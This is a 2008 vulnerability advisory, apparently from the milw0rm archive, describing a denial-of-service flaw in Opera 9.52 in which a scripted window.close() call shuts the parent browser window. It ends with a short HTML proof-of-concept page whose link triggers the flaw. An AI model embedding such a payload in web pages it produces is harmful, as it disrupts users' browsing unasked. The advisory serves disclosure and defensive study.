@@ -1,0 +1,91 @@
+Opera Window Object Suppressing Remote Denial of Service.
+
+*Version Affected:*
+Opera 9.52
+
+*Severity:*
+High
+
+*Description:*
+The opera browser is vulnerable to window object based denial of
+service attack. The opera fails to sanitize a check when window.close()
+function is called in number of dynamically generated events.. The
+function is called in a suppressed manner and kills the parent window
+directly by default which makes it vulnerable to denial of service attack.
+
+This security issue is a result of design flaw in the browser.Scripts
+must not
+close windows that were not opened by script,if script specific code is
+designed.
+There must be a parent window confirmation check prior to close of window.
+
+*Proof of Concept*
+*http://www.secniche.org/opera952/index.html*
+
+Links:
+
+http://www.secniche.org/advisory.html
+http://evilfingers.com/advisory/index.php
+
+*Detection:*
+SecNiche confirmed this vulnerability affects Opera on Microsoft
+Windows XP SP2 platform.The versions tested are:
+
+Opera 9.52
+
+*Disclosure Timeline:*
+Disclosed: 28 September 2008
+Release Date. 28 September ,2008
+
+*Vendor Response:*
+Vulnerability reported to Opera. Bug ID 365663
+
+*Credit:*
+Aditya K Sood
+
+*Disclaimer*
+The information in the advisory is believed to be accurate at the time
+of publishing
+based on currently available information. Use of the information
+constitutes acceptance
+for use in an AS IS condition. There is no representation or warranties,
+either express or
+implied by or with respect to anything in this document, and shall not
+be liable for a ny
+implied warranties of merchantability or fitness for a particular
+purpose or for any indirect
+special or consequential damages.
+
+<html>
+<title>Opera (9.5.2) Window Object Supressing Remote Denial of Service.</title>
+<head></head>
+
+<body><br><br>
+<h2><center>Opera (9.5.2) Window Object Supressing Remote Denial of Service.<br><br>Proof of Concept</br></br> </center></h2>
+
+
+<center>
+<b>Note:: Click the understated links to Trigger the Vulnerability..</b><br><br>
+<hr></hr>
+<b>This POC has been designed with minimum object usage.</b></br></br>
+
+<hr></hr>
+<b><center><a href="javascript:window.close(self);">Opera 9.52 Window Object Suppressing DoS Test POC</a></center>
+
+
+<br>
+Version 9.52<br>
+Build   10108<br>
+Platform Win32<br>
+System Windows XP<br>
+Java Sun Java Runtime Environment version 1.6<br>
+XHTML+Voice Plug-in not loaded<br>
+
+<hr></hr>
+</center>
+</body>
+
+
+</html>
+
+# milw0rm.com [2008-09-28]
